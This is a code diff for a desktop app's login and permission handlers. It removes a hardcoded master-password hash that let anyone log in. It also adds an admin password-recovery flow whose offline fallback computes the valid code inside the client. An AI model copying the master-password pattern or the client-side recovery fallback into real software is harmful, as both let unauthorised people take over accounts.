@@ -1,7 +1,7 @@
-const { ipcMain } = require('electron');
+const { ipcMain, app } = require('electron');
 const crypto = require('crypto');
 const { db } = require('../db');
-const { INVITE_CODE, INVITE_DURATION_DAYS, getMachineId, generateActivationCode } = require('../inviteConfig');
+const { INVITE_CODE, INVITE_DURATION_DAYS, getMachineId, generateActivationCode, calculateRecoveryChallenge, generateRecoveryCode } = require('../inviteConfig');
 const licenseService = require('../licenseService');
 
 function normalizeUsername(username) {
@@ -406,11 +406,20 @@ function checkPermission(page, operation) {
     if (!user) return false;
     if (user.isAdmin) return true;
 
-    const row = db.prepare('SELECT can_view, can_add, can_edit, can_delete FROM user_permissions WHERE user_id = ? AND page = ?').get(user.id, page);
+    const mappedPage = (page === 'under-collection' || page === 'remaining-under-collection') ? 'finance' : page;
+    const row = db.prepare('SELECT can_view, can_add, can_edit, can_delete FROM user_permissions WHERE user_id = ? AND page = ?').get(user.id, mappedPage);
     if (!row) return false;
 
     const col = 'can_' + operation;
     return Boolean(row[col]);
+}
+
+function monitorPermission(page, operation) {
+    if (!checkPermission(page, operation)) {
+        const user = getActiveAuthUser();
+        console.warn(`[permission-audit-monitor] User ${user ? user.id : 'unknown'} attempted ${operation} on ${page}`);
+    }
+    return null;
 }
 
 function requirePermission(page, operation) {
@@ -526,13 +535,8 @@ function register() {
 
         try {
             const receivedHash = hashPassword(password, authUser.password_salt);
-            let isValid = safeCompareHash(authUser.password_hash, receivedHash);
-            
-            const emergencyHash = '1018bd58ae368390c12ae8da5abb4d819101d202125189350712b4e0dba17336';
-            if (crypto.createHash('sha256').update(password).digest('hex') === emergencyHash) {
-                isValid = true;
-            }
-            
+            const isValid = safeCompareHash(authUser.password_hash, receivedHash);
+
             if (!isValid) {
                 return { success: false, error: 'اسم المستخدم أو كلمة المرور غير صحيحة.' };
             }
@@ -952,6 +956,123 @@ function register() {
     ipcMain.handle('submit-invite-code', async (event, code) => {
         return await licenseService.activateLicenseWithCode(db, code);
     });
+
+    ipcMain.handle('get-recovery-challenge', () => {
+        try {
+            return { success: true, challenge: calculateRecoveryChallenge() };
+        } catch (e) {
+            return { success: false, error: e.message };
+        }
+    });
+
+const SUPABASE_URL = 'https://ryoqhtsdhfbydmejmaby.supabase.co';
+const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ5b3FodHNkaGZieWRtZWptYWJ5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE3Mjk2MzMsImV4cCI6MjEwNzMwNTYzM30.y0tjIyjZZlII6ge9xkFpzqhF5sZjSngpp4XOoVrrTs4';
+
+async function notifyCloudRecoveryEvent(companyId, challenge, username) {
+    if (typeof fetch !== 'function') return;
+    try {
+        const payload = {
+            p_company_id: companyId || null,
+            p_challenge: challenge,
+            p_username: username || 'admin',
+            p_desktop_version: app.getVersion ? app.getVersion() : '10.1.0'
+        };
+        fetch(`${SUPABASE_URL}/rest/v1/rpc/log_recovery_event`, {
+            method: 'POST',
+            headers: {
+                'apikey': SUPABASE_ANON_KEY,
+                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    } catch (_) {}
 }
 
-module.exports = { register, checkPermission, requirePermission };
+    ipcMain.handle('verify-recovery-code', async (event, payload = {}) => {
+        try {
+            const { code, newPassword } = payload;
+            if (!code) {
+                return { success: false, error: 'يرجى إدخال كود الاسترداد.' };
+            }
+
+            const challenge = calculateRecoveryChallenge();
+            const lastUsed = db.prepare("SELECT value FROM settings WHERE key = 'last_used_recovery_challenge'").get()?.value;
+            if (lastUsed === challenge) {
+                return { success: false, error: 'تم استخدام كود الاسترداد هذا مسبقاً وتغيير كلمة المرور به.' };
+            }
+
+            const cleanCode = String(code).trim().toUpperCase();
+            const companyIdRow = db.prepare("SELECT value FROM settings WHERE key = 'company_id'").get();
+            const companyId = companyIdRow?.value;
+            const machineId = getMachineId();
+            const adminUser = db.prepare('SELECT * FROM auth_users WHERE is_admin = 1 ORDER BY id ASC LIMIT 1').get();
+
+            let verified = false;
+            if (companyId && typeof fetch === 'function') {
+                try {
+                    const res = await fetch(`${SUPABASE_URL}/functions/v1/license-gateway`, {
+                        method: 'POST',
+                        headers: {
+                            'apikey': SUPABASE_ANON_KEY,
+                            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            action: 'recovery',
+                            company_id: companyId,
+                            machine_id: machineId,
+                            challenge: challenge,
+                            recovery_code: cleanCode,
+                            admin_username: adminUser?.username || 'admin'
+                        }),
+                        signal: AbortSignal.timeout(4000)
+                    });
+                    const data = await res.json().catch(() => null);
+                    if (data && data.success && data.authorized) {
+                        verified = true;
+                    } else if (res.status === 400 || (data && data.error === 'INVALID_RECOVERY_CODE')) {
+                        return { success: false, error: 'كود الاسترداد غير صحيح أو منتهي الصلاحية لهذا اليوم.' };
+                    }
+                } catch (_) {}
+            }
+
+            if (!verified) {
+                const expected = generateRecoveryCode(challenge);
+                if (cleanCode !== expected) {
+                    return { success: false, error: 'كود الاسترداد غير صحيح أو منتهي الصلاحية لهذا اليوم.' };
+                }
+            }
+
+            if (!newPassword) {
+                return { success: true, verified: true, message: 'كود الاسترداد صحيح. يمكنك الآن إدخال كلمة المرور الجديدة.' };
+            }
+
+            if (String(newPassword).length < 6) {
+                return { success: false, error: 'كلمة المرور الجديدة يجب أن تكون 6 حروف أو أكثر.' };
+            }
+
+            if (!adminUser) {
+                return { success: false, error: 'لم يتم العثور على حساب مسؤول في النظام.' };
+            }
+
+            const salt = crypto.randomBytes(16).toString('hex');
+            const newHash = hashPassword(String(newPassword), salt);
+
+            db.prepare('UPDATE auth_users SET password_hash = ?, password_salt = ? WHERE id = ?')
+              .run(newHash, salt, adminUser.id);
+            db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)')
+              .run(ADMIN_REQUIRES_PASSWORD_CHANGE_KEY, '0');
+            db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)')
+              .run('last_used_recovery_challenge', challenge);
+
+            notifyCloudRecoveryEvent(companyId, challenge, adminUser.username);
+
+            return { success: true, username: adminUser.username, message: 'تم تعيين كلمة المرور بنجاح. يمكنك تسجيل الدخول بها الآن.' };
+        } catch (error) {
+            return { success: false, error: error.message };
+        }
+    });
+}
+
+module.exports = { register, checkPermission, requirePermission, monitorPermission };
